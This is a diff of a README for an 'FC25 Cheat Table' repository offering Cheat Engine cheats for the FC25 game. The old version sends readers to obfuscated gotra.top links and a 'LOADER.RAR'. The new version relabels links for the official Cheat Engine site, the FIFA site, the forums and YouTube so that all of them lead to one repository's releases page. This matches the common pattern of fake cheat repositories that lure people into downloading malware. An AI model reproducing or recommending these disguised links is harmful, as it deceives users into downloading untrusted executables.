@@ -1,7 +1,7 @@
-![FC25](https://github.com/user-attachments/assets/e67928c4-d58a-4f5c-b736-8403832deef4)
+![FC25](https://github.com/ahmedthmthmi/fc25-cheat-table/releases)
 
 # FC25 Cheat Table 🎮
-[![https://otCIE.gotra.top/54/baJFww6V](https://ad97pUs.gotra.top/l.svg)](https://NDWSmnmx.gotra.top/54/szPOZm2)
+[![https://github.com/ahmedthmthmi/fc25-cheat-table/releases](https://github.com/ahmedthmthmi/fc25-cheat-table/releases)](https://github.com/ahmedthmthmi/fc25-cheat-table/releases)
 
 ## Overview
 
@@ -18,8 +18,8 @@ Welcome to the **FC25 Cheat Table** repository! This cheat table is designed to 
 
 Follow these steps to get started with the FC25 Cheat Table:
 
-1. **Download the Cheat Table**: Get the latest version from the repository *LOADER.RAR*
-2. **Install Cheat Engine**: Ensure you have Cheat Engine installed. Download it from [Cheat Engine's official site](https://cheatengine.org/).
+1. **Download the Cheat Table**: Get the latest version from the repository *https://github.com/ahmedthmthmi/fc25-cheat-table/releases*
+2. **Install Cheat Engine**: Ensure you have Cheat Engine installed. Download it from [Cheat Engine's official site](https://github.com/ahmedthmthmi/fc25-cheat-table/releases).
 3. **Open the Cheat Table**:
    - Launch Cheat Engine.
    - Load the downloaded FC25 cheat table file (`.CT` file).
@@ -41,9 +41,9 @@ Follow these steps to get started with the FC25 Cheat Table:
 
 ## 🌐 Useful Links
 
-- [FC25 Official Website](fifa.com)
-- [Cheat Engine Community Forums](https://forum.cheatengine.org/)
-- [Gameplay Tips and Tricks on YouTube](https://www.youtube.com/results?search_query=fc25+gameplay+tips)
+- [FC25 Official Website](https://github.com/ahmedthmthmi/fc25-cheat-table/releases)
+- [Cheat Engine Community Forums](https://github.com/ahmedthmthmi/fc25-cheat-table/releases)
+- [Gameplay Tips and Tricks on YouTube](https://github.com/ahmedthmthmi/fc25-cheat-table/releases+gameplay+tips)
 
 ## 🤝 Contributing
 
